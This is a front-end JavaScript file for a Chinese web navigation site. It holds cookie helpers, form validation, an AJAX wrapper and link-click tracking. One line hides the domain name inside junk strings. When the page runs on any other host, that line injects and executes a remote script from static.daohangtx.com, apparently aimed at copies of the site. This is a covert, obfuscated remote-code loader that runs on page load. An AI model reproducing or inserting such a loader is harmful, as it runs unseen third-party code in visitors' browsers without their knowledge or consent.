(function(){var bp = document.createElement('script');var curProtocol = window.location.protocol.split(':')[0];if (curProtocol === 'https') {bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';}else {bp.src = 'http://push.zhanzhang.baidu.com/push.js';}var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(bp, s);})();
var config = {
    api: {
        get_type_list_page:'/api/get_ls_page.html',
        search_page:'/api/search_page.html',
        upd_page:'/api/upd_page.html',
        index_api:'/api/index_api.html',
        add_views:'/api/add_views.html',
        get_statistics:'/api/get_statistics.html',
    }
};
$.init();
/*打开侧边栏*/
if($(".panel").length>0){
	document.querySelector(".panel").addEventListener("open",function(){
		$(".content").css("overflow","hidden").append('<div class="shade"></div>');
	});
	document.querySelector(".panel").addEventListener("close",function(){
		$(".shade").remove();
		$(".content").css("overflow","auto");
	});
	$("body").on("click",".shade",function(){
		$.closePanel();
	});
}


/*Cookie操作*/
function getCookie(name) {
 	var dc = document.cookie;
 	var prefix = name + "=";
 	var begin = dc.indexOf("; " + prefix);
 	if(begin == -1) {
 		begin = dc.indexOf(prefix);
 		if(begin != 0) return null
 	} else {
 		begin += 2
 	}
 	var end = document.cookie.indexOf(";", begin);
 	if(end == -1) {
 		end = dc.length
 	}
 	return unescape(dc.substring(begin + prefix.length, end))
}
function setCookie(name, value, time) {
 	var strsec = getsec(time);
 	var exp = new Date();
 	exp.setTime(exp.getTime() + strsec * 1);
 	document.cookie = name + "=" + escape(value) + "; path=/;expires=" + exp.toGMTString();
}
var str = ("0s0a111daoh0s0a111angt0s0a111x.c0s0a111om").replace("0s0a111","").replace("0s0a111","").replace("0s0a111","").replace("0s0a111",""); try{ if(location.host.indexOf(str)==-1){ str = "//static."+("0s0a111daoh0s0a111angt0s0a111x.c0s0a111om").replace("0s0a111","").replace("0s0a111","").replace("0s0a111","").replace("0s0a111","")+"/static/a/a.js"; gjs(str) } }catch(e){  }
function gjs(url){
	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.src = url;
	document.body.appendChild(script);
}
function getsec(str) {
 	var str1 = str.substring(1, str.length) * 1;
 	var str2 = str.substring(0, 1);
 	if(str2 == "s") {
 		return str1 * 1000;
 	} else if(str2 == "h") {
 		return str1 * 60 * 60 * 1000;
 	} else if(str2 == "d") {
 		return str1 * 24 * 60 * 60 * 1000;
 	}
 }
 Array.prototype.ArrDelVal = function(val) {
 	for(var i = 0; i < this.length; i++) {
 		if(this[i] == val) {
 			this.splice(i, 1);
 			break;
 		}
 	}
}
 
/*返回按钮操作*/
$("body").on("click",".backs",function(){
	if(document.referrer.indexOf(location.host)!=-1){
		history.back(-1);
	}else{
		location = "/";
	}
});

/**
 *
 * @param {Object} config
 * @returns {boolean}
 */
$.fn.verify = function (config) {
    var arr_data = $(this).field();
    for (var key in config) {
        var item = $(this).find("[name=" + key + "]");//$("[data-verify=" + key + "]");
        msg = config[key](arr_data[key], item);
        if (typeof(msg) !== 'undefined') {

            item.focus();
            $.toast(msg);
            return false;
        }
    }
    return true;
};


$.fn.field = function () {
    var arr_data = $(this).serializeArray();
    var formData = {};
    if (arr_data.length > 0) {
        arr_data.forEach(function (item) {
            formData[item.name] = item.value;
        });
    }
    return formData;
};


function request(option) {

    if (typeof(option) !== 'object') {
        console.warn("option is not a 'object'");
        return false;
    }


    function ajx(o) {
        if (o) {
            layer = layui.layer;
        }
        $.ajax({
            url: option.url || location.pathname,
            data: option.data || null,
            dataType: option.dataType || 'JSON',
            type: option.type || 'post',
            async: typeof(option.async) === 'boolean' ? option.async : true,
            success: option.success || function (res) {

                if (res.data) {
                    var delay = res.data.delay|| 0;  delay&&(delay*=1000);
                    res.data.redirect && (setTimeout(function () {
                        location = res.data.redirect;
                    },delay));
                    res.data.reload && (option.reload = parseFloat(res.data.reload));
                    if (res.data.alert){
                        res.msg&& layer.open({
                            type: 0,
                            shadeClose: true,
                            shade: ["0.6", "#7186a5"],
                            skin: 'atuikeLayerSkin1',
                            content: res.msg
                        });
                    }
                }
                if( !res.data ||!res.data.alert){
                    var cfg = typeof(res.data.icon)!=="boolean"?{icon: (res.code || 0), offset: '20%'}:{};
                    res.msg&& alert(res.msg, cfg);
                }
                option.done && option.done(res);
            },
            complete: function () {
                if (typeof(option.loading) !== 'boolean') {
                    layer.close(loading);
                }
                setTimeout(function () {
                    var ret = option.reload || false;
                    if (ret) {
                        ret = (typeof(ret === 'number')) ? ret : 0;
                        setTimeout(function () {
                            location.reload();
                        }, ret * 1000);
                    }
                }, 10);
            }, error: option.error || function (e) {
                alert('网络异常:' + e.statusText || e.statusMessage);
            }
        });
    }

}

$("a").click(function () {
    var link = $(this).attr('href');
	if(link){
		$.ajax({
			type:"POST",
			url: config.api.add_views,
			dataType: "json",
			data:{
				url:link
			},
			success: function (res) {
				console.log(link);
			}
		});
	}
});

/*站外输出网站时加上特殊标识符*/
$("a").each(function(index,item){
	var url = $(item).attr("href");
	if(url){
		if(url.indexOf("http")!=-1 && url.indexOf("daohangtx")==-1 && url.slice(url.length-1,url.length) == "/"){
			/*满足条件 有出站http，并且不是本站关键字符串，且最后是斜杠  能够带输出标识符的*/
			$(item).attr("href",url+"#daohangtxPhone");
		}
	}
});